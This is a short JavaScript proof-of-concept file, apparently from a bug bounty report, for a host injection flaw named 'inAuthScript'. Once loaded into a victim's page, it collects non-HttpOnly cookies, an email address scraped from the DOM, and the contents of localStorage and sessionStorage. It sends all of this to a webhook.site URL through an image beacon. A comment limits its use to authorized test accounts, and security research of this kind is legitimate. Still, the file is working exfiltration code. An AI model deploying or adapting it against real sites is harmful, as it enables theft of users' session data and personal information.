// impact_test.js
// PoC for inAuthScript host injection — run only on authorized test accounts
// Replace webhook id if you want a different one.

// Log for console proof
console.log("Impact PoC loaded from GH Pages");

// Try to read non-HttpOnly cookies
var cookieData = document.cookie || "NO_COOKIE_AVAILABLE";

// Try to read common places where tokens/emails might be visible in DOM
var possibleEmail = "";
try {
  var el = document.querySelector('input[type="email"], input[name="email"], [data-user-email]');
  if (el) {
    possibleEmail = (el.value && el.value.trim()) || (el.textContent && el.textContent.trim()) || "";
  }
} catch (e) {
  // ignore
}

// Try localStorage/sessionStorage (if anything interesting stored)
var ls = "";
try { ls = JSON.stringify(window.localStorage || {}); } catch(e) { ls = "LS_ERROR"; }
var ss = "";
try { ss = JSON.stringify(window.sessionStorage || {}); } catch(e) { ss = "SS_ERROR"; }

// Build small payload (keep length reasonable)
var payload = [
  "cookie=" + encodeURIComponent(cookieData),
  "email=" + encodeURIComponent(possibleEmail),
  "localStorage=" + encodeURIComponent(ls.slice(0,2000)),   // truncate to avoid huge URL
  "sessionStorage=" + encodeURIComponent(ss.slice(0,2000)),
].join("&");

// Send as image beacon to webhook.site (your webhook id)
var beaconUrl = "https://webhook.site/0535ca62-3583-48a2-896d-d18863722cfb?" + payload + "&ts=" + Date.now();

// Fire beacon
new Image().src = beaconUrl;

// Console confirm for local verification
console.log("Impact PoC payload attempted to send:", payload);
console.log("Beacon URL (truncated):", beaconUrl.slice(0,200));
